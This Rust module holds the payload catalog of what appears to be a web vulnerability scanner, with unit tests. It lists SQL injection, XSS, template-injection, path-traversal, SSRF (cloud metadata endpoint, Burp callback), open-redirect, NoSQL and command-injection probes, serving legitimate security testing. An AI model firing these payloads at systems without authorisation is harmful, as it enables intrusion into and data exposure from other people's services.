//! Universal payload engine: context-typed polyglot payloads with their
//! verification method. Every fuzzing scanner draws from this catalog, so
//! payload coverage is defined once instead of per scanner.

/// Where a payload is injected.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum Context {
    /// URL query parameter.
    UrlParam,
    /// JSON request body field value.
    JsonBody,
    /// HTML form field (GET query or POST urlencoded).
    FormData,
    /// HTTP request header (`X-Forwarded-For`, `User-Agent`, `Referer`).
    Header,
}

/// The vulnerability class a payload probes for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum VulnType {
    /// Classic SQL injection (error and time-based).
    SqlInjection,
    /// JSON query-operator injection (`{"$ne": null}` class).
    NoSqlInjection,
    /// Cross-site scripting via unescaped reflection.
    Xss,
    /// Server-side template expression evaluation.
    Ssti,
    /// Path traversal / local file read.
    Lfi,
    /// Server-side fetch of an attacker-controlled URL (SSRF).
    Ssrf,
    /// A URL parameter redirected the response to an attacker-chosen host.
    OpenRedirect,
    /// OS command execution whose output reaches the response.
    CommandInjection,
}

/// How a payload's success is verified from the response.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[non_exhaustive]
pub enum Verification {
    /// The payload (or its evaluated result) appears unescaped in the
    /// response and absent from a clean baseline.
    Reflection,
    /// The response is delayed far over the baseline (>4.5 s for the
    /// `SLEEP(5)`-class payloads).
    TimeDelay,
    /// A database engine error signature surfaces in the response.
    ErrorSignature,
    /// Paired true/false payloads: proof is the differential between the
    /// true branch's response and the false branch's response.
    Boolean,
}

/// One attack payload: where it goes, what it tests, how success is read.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Payload {
    /// Injection surface this payload targets.
    pub context: Context,
    /// Vulnerability class being probed.
    pub vuln: VulnType,
    /// The payload string, submitted as-is.
    pub payload: &'static str,
    /// The verification that turns a response into evidence.
    pub verify: Verification,
}

/// Headers the fuzzer injects into (blind SQLi and log-reflection probes).
pub const HEADER_NAMES: [&str; 3] = ["X-Forwarded-For", "User-Agent", "Referer"];

/// Real command output that only execution can produce (`id`, `/etc/passwd`,
/// shell paths, ping). Reflection of the payload cannot fabricate these.
pub const CMDI_OUTPUT_MARKERS: [&str; 4] = ["uid=", "root:", "/bin/bash", "bytes from"];

/// Boolean-blind SQLi string pair: the true branch evaluates truthy, the
/// false branch falsy; proving the differential needs both responses.
pub const SQLI_BOOLEAN_TRUE: &str = "1' AND '1'='1";
/// Falsy half of [`SQLI_BOOLEAN_TRUE`].
pub const SQLI_BOOLEAN_FALSE: &str = "1' AND '1'='2";

/// Boolean-blind SQLi integer pair, for numeric params where quotes break.
pub const SQLI_BOOLEAN_INT_TRUE: &str = "1 AND 1=1";
/// Falsy half of [`SQLI_BOOLEAN_INT_TRUE`].
pub const SQLI_BOOLEAN_INT_FALSE: &str = "1 AND 1=2";

/// String-injection payloads: URL params, form fields and headers.
const SURFACE_PAYLOADS: &[Payload] = &[
    // SQLi — error-based quote probe first, then the time-based fallbacks.
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "'",
        Verification::ErrorSignature,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "'",
        Verification::ErrorSignature,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "\"",
        Verification::ErrorSignature,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "\"",
        Verification::ErrorSignature,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "' OR 1=1--",
        Verification::ErrorSignature,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "' OR 1=1--",
        Verification::ErrorSignature,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "1' AND SLEEP(5)--",
        Verification::TimeDelay,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "1' AND SLEEP(5)--",
        Verification::TimeDelay,
    ),
    p(
        Context::Header,
        VulnType::SqlInjection,
        "'",
        Verification::ErrorSignature,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "' OR SLEEP(5)--",
        Verification::TimeDelay,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "' OR SLEEP(5)--",
        Verification::TimeDelay,
    ),
    p(
        Context::Header,
        VulnType::SqlInjection,
        "' OR SLEEP(5)--",
        Verification::TimeDelay,
    ),
    // MSSQL polyglot for the same time-based proof.
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        "'; WAITFOR DELAY '0:0:5'--",
        Verification::TimeDelay,
    ),
    p(
        Context::FormData,
        VulnType::SqlInjection,
        "'; WAITFOR DELAY '0:0:5'--",
        Verification::TimeDelay,
    ),
    p(
        Context::Header,
        VulnType::SqlInjection,
        "'; WAITFOR DELAY '0:0:5'--",
        Verification::TimeDelay,
    ),
    // Boolean-blind pairs: string syntax first, integer syntax for numeric IDs.
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        SQLI_BOOLEAN_TRUE,
        Verification::Boolean,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        SQLI_BOOLEAN_FALSE,
        Verification::Boolean,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        SQLI_BOOLEAN_INT_TRUE,
        Verification::Boolean,
    ),
    p(
        Context::UrlParam,
        VulnType::SqlInjection,
        SQLI_BOOLEAN_INT_FALSE,
        Verification::Boolean,
    ),
    // XSS — classic tag and the attribute-breakout polyglot.
    p(
        Context::UrlParam,
        VulnType::Xss,
        "<script>alert(1)</script>",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Xss,
        "<script>alert(1)</script>",
        Verification::Reflection,
    ),
    p(
        Context::Header,
        VulnType::Xss,
        "<script>alert(1)</script>",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::Xss,
        "\"><img src=x onerror=alert(1)>",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Xss,
        "\"><img src=x onerror=alert(1)>",
        Verification::Reflection,
    ),
    p(
        Context::Header,
        VulnType::Xss,
        "\"><img src=x onerror=alert(1)>",
        Verification::Reflection,
    ),
    // SSTI — Jinja/twig, JS template literal, ERB.
    p(
        Context::UrlParam,
        VulnType::Ssti,
        "${7*7}",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Ssti,
        "${7*7}",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::Ssti,
        "{{7*7}}",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Ssti,
        "{{7*7}}",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::Ssti,
        "<%= 7*7 %>",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Ssti,
        "<%= 7*7 %>",
        Verification::Reflection,
    ),
    // LFI — plain traversal, filter-evasion polyglot, Windows path.
    p(
        Context::UrlParam,
        VulnType::Lfi,
        "../../../../etc/passwd",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Lfi,
        "../../../../etc/passwd",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::Lfi,
        "....//....//....//....//etc/passwd",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Lfi,
        "....//....//....//....//etc/passwd",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::Lfi,
        "..\\..\\..\\..\\windows\\win.ini",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Lfi,
        "..\\..\\..\\..\\windows\\win.ini",
        Verification::Reflection,
    ),
    // SSRF — server-side fetch / open-redirect class: the target fetches an
    // attacker-chosen URL; the metadata endpoint proves an internal request.
    p(
        Context::UrlParam,
        VulnType::Ssrf,
        "http://169.254.169.254/latest/meta-data/",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Ssrf,
        "http://169.254.169.254/latest/meta-data/",
        Verification::Reflection,
    ),
    // Blind SSRF — an internal fetch (localtest.me rebinds to localhost) and
    // an out-of-band callback host; neither can be proven offline, so they
    // ride the reflection verifier like the metadata probe above.
    p(
        Context::UrlParam,
        VulnType::Ssrf,
        "http://localtest.me:8080",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::Ssrf,
        "http://spoofed.burpcollaborator.net",
        Verification::Reflection,
    ),
    // Open redirect probes cover absolute, protocol-relative, slash-backslash,
    // and same-origin targets; redirect proof checks the injected value.
    p(
        Context::UrlParam,
        VulnType::OpenRedirect,
        "https://riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::OpenRedirect,
        "//riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::OpenRedirect,
        "/\\riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::OpenRedirect,
        "/",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::OpenRedirect,
        "https://riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::OpenRedirect,
        "//riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::OpenRedirect,
        "/\\riftlock.evil.com/",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::OpenRedirect,
        "/",
        Verification::Reflection,
    ),
    // CMDi — unix `;` chaining, Windows `&` chaining.
    p(
        Context::UrlParam,
        VulnType::CommandInjection,
        "; id; #",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::CommandInjection,
        "; id; #",
        Verification::Reflection,
    ),
    p(
        Context::UrlParam,
        VulnType::CommandInjection,
        "& id &",
        Verification::Reflection,
    ),
    p(
        Context::FormData,
        VulnType::CommandInjection,
        "& id &",
        Verification::Reflection,
    ),
];

/// JSON body payloads, injected as field values on discovered API endpoints.
const JSON_PAYLOADS: &[Payload] = &[
    p(
        Context::JsonBody,
        VulnType::SqlInjection,
        "' OR 1=1--",
        Verification::ErrorSignature,
    ),
    p(
        Context::JsonBody,
        VulnType::NoSqlInjection,
        r#"{"$ne": null}"#,
        Verification::Reflection,
    ),
    p(
        Context::JsonBody,
        VulnType::Xss,
        "<script>alert(1)</script>",
        Verification::Reflection,
    ),
    p(
        Context::JsonBody,
        VulnType::Ssti,
        "${7*7}",
        Verification::Reflection,
    ),
    p(
        Context::JsonBody,
        VulnType::Lfi,
        "../../../../etc/passwd",
        Verification::Reflection,
    ),
    p(
        Context::JsonBody,
        VulnType::CommandInjection,
        "; id; #",
        Verification::Reflection,
    ),
];

const fn p(
    context: Context,
    vuln: VulnType,
    payload: &'static str,
    verify: Verification,
) -> Payload {
    Payload {
        context,
        vuln,
        payload,
        verify,
    }
}

/// Every payload for one injection surface, catalog order.
pub fn payloads_for(context: Context) -> impl Iterator<Item = &'static Payload> {
    let all = if context == Context::JsonBody {
        JSON_PAYLOADS
    } else {
        SURFACE_PAYLOADS
    };
    let mut payloads: Vec<_> = all
        .iter()
        .filter(|payload| payload.context == context)
        .collect();
    payloads.sort_by_key(|payload| match (payload.vuln, payload.verify) {
        (_, Verification::TimeDelay | Verification::Boolean) => 5,
        (VulnType::Xss, _) => 0,
        (VulnType::Lfi, _) => 1,
        (VulnType::Ssti, _) => 2,
        (VulnType::SqlInjection, Verification::ErrorSignature) => 3,
        _ => 4,
    });
    payloads.into_iter()
}

/// Vulnerability classes implied by a parameter's name.
///
/// Mapping (case-insensitive, exact lowercase match):
///
/// | Parameter name       | Vuln classes      |
/// |----------------------|-------------------|
/// | `url`, `redirect`, `next`, `dest` | [`VulnType::Ssrf`], [`VulnType::OpenRedirect`] |
/// | `file`, `path`       | [`VulnType::Lfi`]  |
/// | `q`, `search`        | [`VulnType::Xss`]  |
/// | `template`, `tpl`    | [`VulnType::Ssti`] |
/// | anything else        | *(empty)*          |
pub fn param_vulns(param: &str) -> &'static [VulnType] {
    match param.to_ascii_lowercase().as_str() {
        "url" | "redirect" | "next" | "dest" => &[VulnType::Ssrf, VulnType::OpenRedirect],
        "file" | "path" => &[VulnType::Lfi],
        "q" | "search" => &[VulnType::Xss],
        "template" | "tpl" => &[VulnType::Ssti],
        _ => &[],
    }
}

/// Payloads for `context`, narrowed by what a parameter's name implies:
/// `param_vulns(param)` filters [`payloads_for`]; a recognized name (e.g.
/// `url`, `file`, `q`) yields only the matching class, an unrecognized one
/// yields the full catalog for that context.
pub fn payloads_for_param(param: &str, context: Context) -> Vec<&'static Payload> {
    let vulns = param_vulns(param);
    let matched: Vec<&'static Payload> = payloads_for(context)
        .filter(|pl| vulns.contains(&pl.vuln))
        .collect();
    if matched.is_empty() {
        return payloads_for(context).collect();
    }
    // One payload per implied class first: budgeted probing then covers
    // every class the param name implies before repeating any of them.
    let mut out: Vec<&'static Payload> = Vec::with_capacity(matched.len());
    let mut rest = Vec::new();
    let mut seen: Vec<VulnType> = Vec::new();
    for pl in matched {
        if seen.contains(&pl.vuln) {
            rest.push(pl);
        } else {
            seen.push(pl.vuln);
            out.push(pl);
        }
    }
    out.extend(rest);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_context_has_payloads_for_every_vuln_class() {
        for context in [
            Context::UrlParam,
            Context::JsonBody,
            Context::FormData,
            Context::Header,
        ] {
            let payloads: Vec<_> = payloads_for(context).collect();
            assert!(!payloads.is_empty(), "{context:?} has no payloads");
            let slow = payloads
                .iter()
                .position(|p| matches!(p.verify, Verification::TimeDelay | Verification::Boolean));
            if let Some(slow) = slow {
                assert!(payloads[slow..]
                    .iter()
                    .all(|p| matches!(p.verify, Verification::TimeDelay | Verification::Boolean)));
            }
        }
        // Headers are the blind surface: SQLi and XSS only.
        let header_vulns: Vec<VulnType> = payloads_for(Context::Header).map(|p| p.vuln).collect();
        assert!(header_vulns.contains(&VulnType::SqlInjection));
        assert!(header_vulns.contains(&VulnType::Xss));
        assert!(!header_vulns.contains(&VulnType::Lfi));
    }

    #[test]
    fn json_body_covers_nosql_and_sqli() {
        let vulns: Vec<VulnType> = payloads_for(Context::JsonBody).map(|p| p.vuln).collect();
        assert!(vulns.contains(&VulnType::NoSqlInjection));
        assert!(vulns.contains(&VulnType::SqlInjection));
    }

    #[test]
    fn no_payload_string_is_empty() {
        for p in payloads_for(Context::UrlParam)
            .chain(payloads_for(Context::JsonBody))
            .chain(payloads_for(Context::FormData))
            .chain(payloads_for(Context::Header))
        {
            assert!(!p.payload.is_empty());
        }
    }

    #[test]
    fn param_vulns_maps_known_names_and_is_case_insensitive() {
        assert_eq!(
            param_vulns("url"),
            &[VulnType::Ssrf, VulnType::OpenRedirect]
        );
        assert_eq!(
            param_vulns("URL"),
            &[VulnType::Ssrf, VulnType::OpenRedirect]
        );
        assert_eq!(
            param_vulns("dest"),
            &[VulnType::Ssrf, VulnType::OpenRedirect]
        );
        assert_eq!(param_vulns("file"), &[VulnType::Lfi]);
        assert_eq!(param_vulns("q"), &[VulnType::Xss]);
        assert!(param_vulns("mystery").is_empty());
    }

    #[test]
    fn url_param_yields_only_ssrf_and_redirect_payloads() {
        let payloads = payloads_for_param("url", Context::UrlParam);
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert!(matches!(p.vuln, VulnType::Ssrf | VulnType::OpenRedirect));
        }
        assert!(payloads
            .iter()
            .any(|p| p.payload.contains("169.254.169.254")));
        assert!(payloads
            .iter()
            .any(|p| p.payload.contains("riftlock.evil.com")));
    }

    #[test]
    fn blind_ssrf_probes_cover_url_and_form_surfaces() {
        assert!(
            payloads_for(Context::UrlParam).any(|p| p.vuln == VulnType::Ssrf
                && p.verify == Verification::Reflection
                && p.payload.contains("localtest.me"))
        );
        assert!(
            payloads_for(Context::FormData).any(|p| p.vuln == VulnType::Ssrf
                && p.verify == Verification::Reflection
                && p.payload.contains("burpcollaborator"))
        );
    }

    #[test]
    fn search_form_param_yields_only_xss() {
        let payloads = payloads_for_param("q", Context::FormData);
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.vuln, VulnType::Xss);
        }
    }

    #[test]
    fn unknown_param_yields_full_catalog() {
        let payloads = payloads_for_param("mystery", Context::UrlParam);
        assert!(!payloads.is_empty());
        let vulns: Vec<VulnType> = payloads.iter().map(|p| p.vuln).collect();
        assert!(vulns.contains(&VulnType::SqlInjection));
        assert!(vulns.contains(&VulnType::Xss));
    }

    #[test]
    fn boolean_pairs_cover_string_and_integer() {
        let payloads: Vec<&str> = payloads_for(Context::UrlParam)
            .filter(|p| p.verify == Verification::Boolean)
            .map(|p| p.payload)
            .collect();
        for expected in [
            SQLI_BOOLEAN_TRUE,
            SQLI_BOOLEAN_FALSE,
            SQLI_BOOLEAN_INT_TRUE,
            SQLI_BOOLEAN_INT_FALSE,
        ] {
            assert!(payloads.contains(&expected), "missing {expected}");
        }
    }

    #[test]
    fn time_based_sqli_exists_for_every_surface() {
        for context in [Context::UrlParam, Context::FormData, Context::Header] {
            assert!(
                payloads_for(context).any(|p| p.vuln == VulnType::SqlInjection
                    && p.verify == Verification::TimeDelay
                    && p.payload.contains("SLEEP(5)")),
                "{context:?} lacks a SLEEP(5) fallback"
            );
        }
    }
}
